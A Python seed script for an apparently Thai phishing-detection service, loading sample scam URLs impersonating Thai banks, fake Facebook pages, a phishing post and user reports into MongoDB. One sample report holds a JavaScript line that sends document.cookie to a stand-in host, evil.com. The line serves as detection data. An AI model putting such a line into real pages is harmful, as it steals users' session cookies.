"""
db_setup.py – One-time setup script & seed data loader
Run directly:  python -m app.db_setup
"""
import asyncio
import os
from datetime import datetime
from dotenv import load_dotenv # type: ignore

load_dotenv()

from app.core.database import ( # type: ignore
    init_mongodb, get_database,
    add_fake_url, add_phishing_url, add_safe_url,
    add_fake_facebook_page, add_facebook_phishing_post, add_safe_facebook_page,
    save_user_question, save_user_report, save_sourcecode_report,
)


# ── Seed data ────────────────────────────────────────────────────────────────

SEED_FAKE_URLS = [
    {"url": "http://scam-bank-th.xyz/login", "domain": "scam-bank-th.xyz",
     "description": "หน้าเข้าสู่ระบบธนาคารปลอมที่คัดลอกจากธนาคารกสิกรไทย", "source": "admin"},
    {"url": "http://fake-krungthai-secure.com/auth", "domain": "fake-krungthai-secure.com",
     "description": "เว็บปลอมแอบอ้างธนาคารกรุงไทย", "source": "admin"},
]

SEED_PHISHING_URLS = [
    {"url": "http://verify-account-th.info/confirm", "domain": "verify-account-th.info",
     "threat_level": "high", "target_brand": "SCB", "source": "virustotal"},
    {"url": "http://promo-flash-sale99.com/claim", "domain": "promo-flash-sale99.com",
     "threat_level": "medium", "target_brand": "Shopee", "source": "user_report"},
]

SEED_SAFE_URLS = [
    {"url": "https://www.kasikornbank.com", "domain": "kasikornbank.com",
     "category": "banking", "source": "admin"},
    {"url": "https://www.scb.co.th", "domain": "scb.co.th",
     "category": "banking", "source": "admin"},
    {"url": "https://www.facebook.com", "domain": "facebook.com",
     "category": "social_media", "source": "admin"},
]

SEED_FAKE_FB_PAGES = [
    {"page_url": "https://www.facebook.com/kasikorn.bank.fake",
     "page_name": "ธนาคารกสิกรไทย [ปลอม]",
     "impersonates": "KBank Official", "evidence": "ใช้โลโก้เหมือนกัน แต่มีการขอข้อมูลส่วนตัว"},
]

SEED_FB_PHISHING_POSTS = [
    {"post_url": "https://www.facebook.com/permalink/123456789",
     "content": "แจกเงินฟรี! คลิกลิงก์เพื่อรับสิทธิ์ทันที แค่กรอกข้อมูลบัตรประชาชน",
     "phishing_link": "http://free-money-th.xyz/claim", "page_name": "แจกเงินรัฐบาลไทย"},
]

SEED_SAFE_FB_PAGES = [
    {"page_url": "https://www.facebook.com/KBank.Fanpage",
     "page_name": "KBank", "official_brand": "Kasikorn Bank", "verified": True},
    {"page_url": "https://www.facebook.com/SCBThailand",
     "page_name": "SCB Thailand", "official_brand": "Siam Commercial Bank", "verified": True},
]


async def seed_data():
    """Insert sample documents into all collections (skip duplicates)."""
    print("[SEED] Inserting sample data …")

    for item in SEED_FAKE_URLS:
        ok = await add_fake_url(**item)
        print(f"  fake_url {'[OK]' if ok else '(dup)'}: {item['url']}")

    for item in SEED_PHISHING_URLS:
        ok = await add_phishing_url(**item)
        print(f"  phishing_url {'[OK]' if ok else '(dup)'}: {item['url']}")

    for item in SEED_SAFE_URLS:
        ok = await add_safe_url(**item)
        print(f"  safe_url {'[OK]' if ok else '(dup)'}: {item['url']}")

    for item in SEED_FAKE_FB_PAGES:
        ok = await add_fake_facebook_page(**item)
        print(f"  fake_fb_page {'[OK]' if ok else '(dup)'}: {item['page_url']}")

    for item in SEED_FB_PHISHING_POSTS:
        ok = await add_facebook_phishing_post(**item)
        print(f"  fb_phishing_post {'[OK]' if ok else '(dup)'}: {item['post_url']}")

    for item in SEED_SAFE_FB_PAGES:
        ok = await add_safe_facebook_page(**item)
        print(f"  safe_fb_page {'[OK]' if ok else '(dup)'}: {item['page_url']}")

    # Question sample
    qid = await save_user_question(
        email="user@example.com",
        question="เว็บไซต์นี้ปลอดภัยไหมครับ? http://suspicious-site.com",
        context_url="http://suspicious-site.com",
    )
    print(f"  user_admin_question [OK] id={qid}")

    # Report sample
    rid = await save_user_report(
        email="report@example.com",
        report_type="phishing_url",
        url="http://example-phish.com/login",
        description="ได้รับลิงก์นี้มาทาง SMS อ้างว่าเป็นธนาคาร",
    )
    print(f"  user_report [OK] id={rid}")

    # Source code report sample
    sid = await save_sourcecode_report(
        email="dev@example.com",
        source_code='fetch("http://evil.com/steal?c="+document.cookie)',
        language="javascript",
        description="พบ script นี้ฝังอยู่ในเว็บไซต์ที่ไม่รู้จัก",
        filename="inject.js",
    )
    print(f"  sourcecode_report [OK] id={sid}")

    print("[SEED] Done.")


async def print_stats():
    """Print document counts for all collections."""
    db = get_database()
    collections = [
        "fake_urls", "phishing_urls", "safe_urls",
        "fake_facebook_pages", "facebook_phishing_posts", "safe_facebook_pages",
        "user_admin_questions", "user_reports", "user_sourcecode_reports",
    ]
    print("\n[STATS] Collection document counts:")
    for col in collections:
        count = await db[col].count_documents({})
        print(f"  {col:<30} : {count} documents")


async def main():
    await init_mongodb()
    await seed_data()
    await print_stats()


if __name__ == "__main__":
    import sys
    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(main())
